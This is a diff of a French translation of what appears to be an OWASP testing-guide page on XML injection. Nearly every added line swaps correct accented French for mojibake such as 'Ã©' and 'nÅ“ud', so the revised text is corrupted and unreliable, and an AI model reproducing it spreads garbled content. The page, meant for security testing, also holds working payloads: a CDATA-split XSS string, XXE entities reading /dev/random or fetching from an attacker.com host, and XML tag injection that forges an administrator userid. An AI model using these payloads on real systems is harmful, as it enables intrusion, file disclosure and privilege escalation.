@@ -6,20 +6,20 @@
 
 ## Sommaire
 
-Le test d'injection XML se produit lorsqu'un testeur tente d'injecter un document XML dans l'application. Si l'analyseur XML ne parvient pas à valider contextuellement les données, le test donnera un résultat positif.
+Le test d'injection XML se produit lorsqu'un testeur tente d'injecter un document XML dans l'application. Si l'analyseur XML ne parvient pas Ã  valider contextuellement les donnÃ©es, le test donnera un rÃ©sultat positif.
 
-Cette section décrit des exemples pratiques d'injection XML. Dans un premier temps, une communication de style XML sera définie et ses principes de fonctionnement expliqués. Ensuite, la méthode de découverte dans laquelle on essaie d'insérer des métacaractères XML. Une fois la première étape accomplie, le testeur disposera de quelques informations sur la structure XML, il sera donc possible d'essayer d'injecter des données et des balises XML (Tag Injection).
+Cette section dÃ©crit des exemples pratiques d'injection XML. Dans un premier temps, une communication de style XML sera dÃ©finie et ses principes de fonctionnement expliquÃ©s. Ensuite, la mÃ©thode de dÃ©couverte dans laquelle on essaie d'insÃ©rer des mÃ©tacaractÃ¨res XML. Une fois la premiÃ¨re Ã©tape accomplie, le testeur disposera de quelques informations sur la structure XML, il sera donc possible d'essayer d'injecter des donnÃ©es et des balises XML (Tag Injection).
 
 ## Objectifs des tests
 
 - Identifier les points d'injection XML.
-- Évaluer les types d'exploits pouvant être atteints et leur gravité.
+- Ã‰valuer les types d'exploits pouvant Ãªtre atteints et leur gravitÃ©.
 
 ## Comment tester
 
-Supposons qu'il existe une application Web utilisant une communication de style XML afin d'effectuer l'enregistrement des utilisateurs. Cela se fait en créant et en ajoutant un nouveau nœud `user>` dans un fichier `xmlDb`.
+Supposons qu'il existe une application Web utilisant une communication de style XML afin d'effectuer l'enregistrement des utilisateurs. Cela se fait en crÃ©ant et en ajoutant un nouveau nÅ“ud `user>` dans un fichier `xmlDb`.
 
-Supposons que le fichier xmlDB ressemble à ceci :
+Supposons que le fichier xmlDB ressemble Ã  ceciÂ :
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -39,9 +39,9 @@ Supposons que le fichier xmlDB ressemble à ceci :
 </users>
 ```
 
-Lorsqu'un utilisateur s'enregistre en remplissant un formulaire HTML, l'application reçoit les données de l'utilisateur dans une requête standard, qui, par souci de simplicité, sera censée être envoyée sous la forme d'une requête `GET`.
+Lorsqu'un utilisateur s'enregistre en remplissant un formulaire HTML, l'application reÃ§oit les donnÃ©es de l'utilisateur dans une requÃªte standard, qui, par souci de simplicitÃ©, sera censÃ©e Ãªtre envoyÃ©e sous la forme d'une requÃªte `GET`.
 
-Par exemple, les valeurs suivantes :
+Par exemple, les valeurs suivantesÂ :
 
 ```txt
 Username: tony
@@ -49,11 +49,11 @@ Password: Un6R34kb!e
 E-mail: s4tan@hell.com
 ```
 
-produira la requête :
+produira la requÃªteÂ :
 
 `http://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&email=s4tan@hell.com`
 
-L'application construit alors le nœud suivant :
+L'application construit alors le nÅ“ud suivantÂ :
 
 ```xml
 <user>
@@ -64,7 +64,7 @@ L'application construit alors le nœud suivant :
 </user>
 ```
 
-qui sera ajouté à la xmlDB :
+qui sera ajoutÃ© Ã  la xmlDBÂ :
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -90,15 +90,15 @@ qui sera ajouté à la xmlDB :
 </users>
 ```
 
-### Découverte
+### DÃ©couverte
 
-La première étape pour tester une application pour la présence d'une vulnérabilité XML Injection consiste à essayer d'insérer des métacaractères XML.
+La premiÃ¨re Ã©tape pour tester une application pour la prÃ©sence d'une vulnÃ©rabilitÃ© XML Injection consiste Ã  essayer d'insÃ©rer des mÃ©tacaractÃ¨res XML.
 
-Les métacaractères XML sont :
+Les mÃ©tacaractÃ¨res XML sontÂ :
 
-- Guillemet simple : `'` - Lorsqu'il n'est pas nettoyé, ce caractère peut générer une exception lors de l'analyse XML, si la valeur injectée va faire partie d'une valeur d'attribut dans une balise.
+- Guillemet simpleÂ : `'` - Lorsqu'il n'est pas nettoyÃ©, ce caractÃ¨re peut gÃ©nÃ©rer une exception lors de l'analyse XML, si la valeur injectÃ©e va faire partie d'une valeur d'attribut dans une balise.
 
-Par exemple, supposons qu'il existe l'attribut suivant :
+Par exemple, supposons qu'il existe l'attribut suivantÂ :
 
 `<node attrib='$inputValue'/>`
 
@@ -106,13 +106,13 @@ Alors, si :
 
 `inputValue = foo'`
 
-est instancié puis inséré en tant que valeur d'attribut :
+est instanciÃ© puis insÃ©rÃ© en tant que valeur d'attributÂ :
 
 `<node attrib='foo''/>`
 
-alors, le document XML résultant n'est pas bien formé.
+alors, le document XML rÃ©sultant n'est pas bien formÃ©.
 
-- Guillemet double : `"` - ce caractère a la même signification que le guillemet simple et peut être utilisé si la valeur de l'attribut est entourée de guillemets doubles.
+- Guillemet doubleÂ : `"` - ce caractÃ¨re a la mÃªme signification que le guillemet simple et peut Ãªtre utilisÃ© si la valeur de l'attribut est entourÃ©e de guillemets doubles.
 
 `<node attrib="$inputValue"/>`
 
@@ -124,13 +124,13 @@ la substitution donne :
 
 `<node attrib="foo""/>`
 
-et le document XML résultant n'est pas valide.
+et le document XML rÃ©sultant n'est pas valide.
 
-- Parenthèses angulaires : `>` et `<` - En ajoutant une parenthèse angulaire ouverte ou fermée dans une entrée utilisateur comme suit :
+- ParenthÃ¨ses angulairesÂ : `>` et `<` - En ajoutant une parenthÃ¨se angulaire ouverte ou fermÃ©e dans une entrÃ©e utilisateur comme suitÂ :
 
 `Username = foo<`
 
-l'application construira un nouveau nœud :
+l'application construira un nouveau nÅ“udÂ :
 
 ```xml
 <user>
@@ -141,13 +141,13 @@ l'application construira un nouveau nœud :
 </user>
 ```
 
-mais, à cause de la présence du '<' ouvert, le document XML résultant n'est pas valide.
+mais, Ã  cause de la prÃ©sence du '<' ouvert, le document XML rÃ©sultant n'est pas valide.
 
-- Balise de commentaire : `<!--/-->` - Cette séquence de caractères est interprétée comme le début/la fin d'un commentaire. Donc en injectant l'un d'eux dans le paramètre Username :
+- Balise de commentaireÂ : `<!--/-->` - Cette sÃ©quence de caractÃ¨res est interprÃ©tÃ©e comme le dÃ©but/la fin d'un commentaire. Donc en injectant l'un d'eux dans le paramÃ¨tre Username :
 
 `Username = foo<!--`
 
-l'application construira un nœud comme celui-ci :
+l'application construira un nÅ“ud comme celui-ciÂ :
 
 ```xml
 <user>
@@ -158,23 +158,23 @@ l'application construira un nœud comme celui-ci :
 </user>
 ```
 
-qui ne sera pas une séquence XML valide.
+qui ne sera pas une sÃ©quence XML valide.
 
-- Esperluette : `&`- L'esperluette est utilisée dans la syntaxe XML pour représenter des entités. Le format d'une entité est `&symbol;`. Une entité est mappée à un caractère du jeu de caractères Unicode.
+- EsperluetteÂ : `&`- L'esperluette est utilisÃ©e dans la syntaxe XML pour reprÃ©senter des entitÃ©s. Le format d'une entitÃ© est `&symbol;`. Une entitÃ© est mappÃ©e Ã  un caractÃ¨re du jeu de caractÃ¨res Unicode.
 
 Par exemple:
 
 `<tagnode>&lt;</tagnode>`
 
-est bien formé et valide, et représente le caractère ASCII `<`.
+est bien formÃ© et valide, et reprÃ©sente le caractÃ¨re ASCII `<`.
 
-Si `&` n'est pas lui-même encodé avec `&amp;`, il pourrait être utilisé pour tester l'injection XML.
+Si `&` n'est pas lui-mÃªme encodÃ© avec `&amp;`, il pourrait Ãªtre utilisÃ© pour tester l'injection XML.
 
-En fait, si une entrée comme celle-ci est fournie :
+En fait, si une entrÃ©e comme celle-ci est fournieÂ :
 
 `Username = &foo`
 
-un nouveau nœud sera créé :
+un nouveau nÅ“ud sera crÃ©Ã©Â :
 
 ```xml
 <user>
@@ -185,11 +185,11 @@ un nouveau nœud sera créé :
 </user>
 ```
 
-mais, encore une fois, le document n'est pas valide : `&foo` ne se termine pas par `;` et l'entité `&foo;` n'est pas définie.
+mais, encore une fois, le document n'est pas valideÂ : `&foo` ne se termine pas par `;` et l'entitÃ© `&foo;` n'est pas dÃ©finie.
 
-- Délimiteurs de section CDATA : `<!\[CDATA\[ / ]]>` - Les sections CDATA sont utilisées pour échapper des blocs de texte contenant des caractères qui seraient autrement reconnus comme du balisage. En d'autres termes, les caractères inclus dans une section CDATA ne sont pas analysés par un analyseur XML.
+- DÃ©limiteurs de section CDATA : `<!\[CDATA\[ / ]]>` - Les sections CDATA sont utilisÃ©es pour Ã©chapper des blocs de texte contenant des caractÃ¨res qui seraient autrement reconnus comme du balisage. En d'autres termes, les caractÃ¨res inclus dans une section CDATA ne sont pas analysÃ©s par un analyseur XML.
 
-Par exemple, s'il est nécessaire de représenter la chaîne `<foo>` à l'intérieur d'un nœud de texte, une section CDATA peut être utilisée :
+Par exemple, s'il est nÃ©cessaire de reprÃ©senter la chaÃ®ne `<foo>` Ã  l'intÃ©rieur d'un nÅ“ud de texte, une section CDATA peut Ãªtre utilisÃ©eÂ :
 
 ```xml
 <node>
@@ -197,13 +197,13 @@ Par exemple, s'il est nécessaire de représenter la chaîne `<foo>` à l'intérieur 
 </node>
 ```
 
-de sorte que `<foo>` ne sera pas analysé comme un balisage et sera considéré comme une donnée de caractère.
+de sorte que `<foo>` ne sera pas analysÃ© comme un balisage et sera considÃ©rÃ© comme une donnÃ©e de caractÃ¨re.
 
-Si un nœud est créé de la manière suivante :
+Si un nÅ“ud est crÃ©Ã© de la maniÃ¨re suivanteÂ :
 
 `<username><![CDATA[<$userName]]></username>`
 
-le testeur pourrait essayer d'injecter la chaîne CDATA de fin `]]>` afin d'essayer d'invalider le document XML.
+le testeur pourrait essayer d'injecter la chaÃ®ne CDATA de fin `]]>` afin d'essayer d'invalider le document XML.
 
 `userName = ]]>`
 
@@ -213,9 +213,9 @@ cela deviendra :
 
 qui n'est pas un fragment XML valide.
 
-Un autre test est lié à la balise CDATA. Supposons que le document XML est traité pour générer une page HTML. Dans ce cas, les délimiteurs de section CDATA peuvent être simplement éliminés, sans inspecter davantage leur contenu. Ensuite, il est possible d'injecter des balises HTML, qui seront incluses dans la page générée, en contournant complètement les routines de nettoyage existantes.
+Un autre test est liÃ© Ã  la balise CDATA. Supposons que le document XML est traitÃ© pour gÃ©nÃ©rer une page HTML. Dans ce cas, les dÃ©limiteurs de section CDATA peuvent Ãªtre simplement Ã©liminÃ©s, sans inspecter davantage leur contenu. Ensuite, il est possible d'injecter des balises HTML, qui seront incluses dans la page gÃ©nÃ©rÃ©e, en contournant complÃ¨tement les routines de nettoyage existantes.
 
-Prenons un exemple concret. Supposons que nous ayons un nœud contenant du texte qui sera affiché à l'utilisateur.
+Prenons un exemple concret. Supposons que nous ayons un nÅ“ud contenant du texte qui sera affichÃ© Ã  l'utilisateur.
 
 ```xml
 <html>
@@ -223,11 +223,11 @@ Prenons un exemple concret. Supposons que nous ayons un nœud contenant du texte 
 </html>
 ```
 
-Ensuite, un attaquant peut fournir l'entrée suivante :
+Ensuite, un attaquant peut fournir l'entrÃ©e suivanteÂ :
 
 `$HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>`
 
-et obtenir le nœud suivant :
+et obtenir le nÅ“ud suivantÂ :
 
 ```xml
 <html>
@@ -235,7 +235,7 @@ et obtenir le nœud suivant :
 </html>
 ```
 
-Lors du traitement, les délimiteurs de section CDATA sont éliminés, générant le code HTML suivant :
+Lors du traitement, les dÃ©limiteurs de section CDATA sont Ã©liminÃ©s, gÃ©nÃ©rant le code HTML suivantÂ :
 
 ```html
 <script>
@@ -243,11 +243,11 @@ Lors du traitement, les délimiteurs de section CDATA sont éliminés, générant le 
 </script>
 ```
 
-Le résultat est que l'application est vulnérable à XSS.
+Le rÃ©sultat est que l'application est vulnÃ©rable Ã  XSS.
 
-Entité externe : l'ensemble des entités valides peut être étendu en définissant de nouvelles entités. Si la définition d'une entité est un URI, l'entité est appelée une entité externe. Sauf configuration contraire, les entités externes forcent l'analyseur XML à accéder à la ressource spécifiée par l'URI, par exemple, un fichier sur la machine locale ou sur un système distant. Ce comportement expose l'application aux attaques XML eXternal Entity (XXE), qui peuvent être utilisées pour effectuer un déni de service du système local, obtenir un accès non autorisé aux fichiers sur la machine locale, analyser des machines distantes et effectuer un déni de service de systèmes distants. .
+EntitÃ© externeÂ : l'ensemble des entitÃ©s valides peut Ãªtre Ã©tendu en dÃ©finissant de nouvelles entitÃ©s. Si la dÃ©finition d'une entitÃ© est un URI, l'entitÃ© est appelÃ©e une entitÃ© externe. Sauf configuration contraire, les entitÃ©s externes forcent l'analyseur XML Ã  accÃ©der Ã  la ressource spÃ©cifiÃ©e par l'URI, par exemple, un fichier sur la machine locale ou sur un systÃ¨me distant. Ce comportement expose l'application aux attaques XML eXternal Entity (XXE), qui peuvent Ãªtre utilisÃ©es pour effectuer un dÃ©ni de service du systÃ¨me local, obtenir un accÃ¨s non autorisÃ© aux fichiers sur la machine locale, analyser des machines distantes et effectuer un dÃ©ni de service de systÃ¨mes distants. .
 
-Pour tester les vulnérabilités XXE, on peut utiliser l'entrée suivante :
+Pour tester les vulnÃ©rabilitÃ©s XXE, on peut utiliser l'entrÃ©e suivanteÂ :
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -256,7 +256,7 @@ Pour tester les vulnérabilités XXE, on peut utiliser l'entrée suivante :
         <foo>&xxe;</foo>
 ```
 
-Ce test peut planter le serveur Web (sur un système UNIX) si l'analyseur XML tente de remplacer l'entité par le contenu du fichier /dev/random.
+Ce test peut planter le serveur Web (sur un systÃ¨me UNIX) si l'analyseur XML tente de remplacer l'entitÃ© par le contenu du fichier /dev/random.
 
 D'autres tests utiles sont les suivants :
 
@@ -278,11 +278,11 @@ D'autres tests utiles sont les suivants :
         <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]><foo>&xxe;</foo>
 ```
 
-### Injection de balises
+### Injection de balises
 
-Une fois la première étape accomplie, le testeur disposera de quelques informations sur la structure du document XML. Ensuite, il est possible d'essayer d'injecter des données et des balises XML. Nous montrerons un exemple de la façon dont cela peut conduire à une attaque par escalade de privilèges.
+Une fois la premiÃ¨re Ã©tape accomplie, le testeur disposera de quelques informations sur la structure du document XML. Ensuite, il est possible d'essayer d'injecter des donnÃ©es et des balises XML. Nous montrerons un exemple de la faÃ§on dont cela peut conduire Ã  une attaque par escalade de privilÃ¨ges.
 
-Considérons l'application précédente. En insérant les valeurs suivantes :
+ConsidÃ©rons l'application prÃ©cÃ©dente. En insÃ©rant les valeurs suivantesÂ :
 
 ```txt
 Username: tony
@@ -290,7 +290,7 @@ Password: Un6R34kb!e
 E-mail: s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com
 ```
 
-l'application construira un nouveau nœud et l'ajoutera à la base de données XML :
+l'application construira un nouveau nÅ“ud et l'ajoutera Ã  la base de donnÃ©es XMLÂ :
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -318,11 +318,11 @@ l'application construira un nouveau nœud et l'ajoutera à la base de données XML 
 </users>
 ```
 
-Le fichier XML résultant est bien formé. De plus, il est probable que, pour l'utilisateur tony, la valeur associée à la balise userid soit celle apparaissant en dernier, c'est-à-dire 0 (l'ID administrateur). En d'autres termes, nous avons injecté un utilisateur avec des privilèges administratifs.
+Le fichier XML rÃ©sultant est bien formÃ©. De plus, il est probable que, pour l'utilisateur tony, la valeur associÃ©e Ã  la balise userid soit celle apparaissant en dernier, c'est-Ã -dire 0 (l'ID administrateur). En d'autres termes, nous avons injectÃ© un utilisateur avec des privilÃ¨ges administratifs.
 
-Le seul problème est que la balise userid apparaît deux fois dans le dernier nœud utilisateur. Souvent, les documents XML sont associés à un schéma ou à une DTD et seront rejetés s'ils ne s'y conforment pas.
+Le seul problÃ¨me est que la balise userid apparaÃ®t deux fois dans le dernier nÅ“ud utilisateur. Souvent, les documents XML sont associÃ©s Ã  un schÃ©ma ou Ã  une DTD et seront rejetÃ©s s'ils ne s'y conforment pas.
 
-Supposons que le document XML est spécifié par la DTD suivante :
+Supposons que le document XML est spÃ©cifiÃ© par la DTD suivanteÂ :
 
 ```xml
 <!DOCTYPE users [
@@ -335,9 +335,9 @@ Supposons que le document XML est spécifié par la DTD suivante :
 ]>
 ```
 
-Notez que le nœud userid est défini avec la cardinalité 1. Dans ce cas, l'attaque que nous avons montrée précédemment (et d'autres attaques simples) ne fonctionnera pas si le document XML est validé par rapport à sa DTD avant tout traitement.
+Notez que le nÅ“ud userid est dÃ©fini avec la cardinalitÃ© 1. Dans ce cas, l'attaque que nous avons montrÃ©e prÃ©cÃ©demment (et d'autres attaques simples) ne fonctionnera pas si le document XML est validÃ© par rapport Ã  sa DTD avant tout traitement.
 
-Cependant, ce problème peut être résolu, si le testeur contrôle la valeur de certains nœuds précédant le nœud incriminé (userid, dans cet exemple). En fait, le testeur peut commenter un tel nœud, en injectant une séquence de début/fin de commentaire :
+Cependant, ce problÃ¨me peut Ãªtre rÃ©solu, si le testeur contrÃ´le la valeur de certains nÅ“uds prÃ©cÃ©dant le nÅ“ud incriminÃ© (userid, dans cet exemple). En fait, le testeur peut commenter un tel nÅ“ud, en injectant une sÃ©quence de dÃ©but/fin de commentaireÂ :
 
 ```txt
 Username: tony
@@ -345,7 +345,7 @@ Password: Un6R34kb!e</password><!--
 E-mail: --><userid>0</userid><mail>s4tan@hell.com
 ```
 
-Dans ce cas, la base de données XML finale est :
+Dans ce cas, la base de donnÃ©es XML finale estÂ :
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -371,11 +371,11 @@ Dans ce cas, la base de données XML finale est :
 </users>
 ```
 
-Le nœud original `userid` a été commenté, ne laissant que celui injecté. Le document est désormais conforme à ses règles DTD.
+Le nÅ“ud original `userid` a Ã©tÃ© commentÃ©, ne laissant que celui injectÃ©. Le document est dÃ©sormais conforme Ã  ses rÃ¨gles DTD.
 
 ## Examen du code source
 
-L'API Java suivante peut être vulnérable à XXE si elle n'est pas configurée correctement.
+L'API Java suivante peut Ãªtre vulnÃ©rable Ã  XXE si elle n'est pas configurÃ©e correctement.
 
 ```text
 javax.xml.parsers.DocumentBuilder
@@ -399,28 +399,28 @@ XMLReader
 Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser
 ```
 
-Vérifiez le code source si les entités docType, DTD externe et paramètre externe sont définies comme des utilisations interdites.
+VÃ©rifiez le code source si les entitÃ©s docType, DTD externe et paramÃ¨tre externe sont dÃ©finies comme des utilisations interdites.
 
-- [Aide-mémoire sur la prévention des entités externes XML (XXE)](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
+- [Aide-mÃ©moire sur la prÃ©vention des entitÃ©s externes XML (XXE)](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
 
-De plus, le lecteur Java POI office peut être vulnérable à XXE si la version est inférieure à 3.10.1.
+De plus, le lecteur Java POI office peut Ãªtre vulnÃ©rable Ã  XXE si la version est infÃ©rieure Ã  3.10.1.
 
-La version de la bibliothèque POI peut être identifiée à partir du nom de fichier du JAR. Par exemple,
+La version de la bibliothÃ¨que POI peut Ãªtre identifiÃ©e Ã  partir du nom de fichier du JAR. Par exemple,
 
 - `poi-3.8.jar`
 - `poi-ooxml-3.8.jar`
 
-Le mot clé de code source suivant peut s'appliquer à C.
+Le mot clÃ© de code source suivant peut s'appliquer Ã  C.
 
-- libxml2 : xmlCtxtReadMemory, xmlCtxtUseOptions, xmlParseInNodeContext, xmlReadDoc, xmlReadFd, xmlReadFile, xmlReadIO, xmlReadMemory, xmlCtxtReadDoc, xmlCtxtReadFd, xmlCtxtReadFile, xmlCtxtReadIO
-- libxerces-c : XercesDOMParser, SAXParser, SAX2XMLReader
+- libxml2Â : xmlCtxtReadMemory, xmlCtxtUseOptions, xmlParseInNodeContext, xmlReadDoc, xmlReadFd, xmlReadFile, xmlReadIO, xmlReadMemory, xmlCtxtReadDoc, xmlCtxtReadFd, xmlCtxtReadFile, xmlCtxtReadIO
+- libxerces-cÂ : XercesDOMParser, SAXParser, SAX2XMLReader
 
 ## Outils
 
-- [Chaînes Fuzz d'injection XML (de l'outil wfuzz)] (https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)
+- [ChaÃ®nes Fuzz d'injection XML (de l'outil wfuzz)](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)
 
-## Références
+## RÃ©fÃ©rences
 
 - [Injection XML](https://www.whitehatsec.com/glossary/content/xml-injection)
 - [Gregory Steuck, "attaque XXE (Xml eXternal Entity)"](https://www.securityfocus.com/archive/1/297714)
-- [Aide-mémoire de prévention OWASP XXE] (https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
+- [Aide-mÃ©moire de prÃ©vention OWASP XXE](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
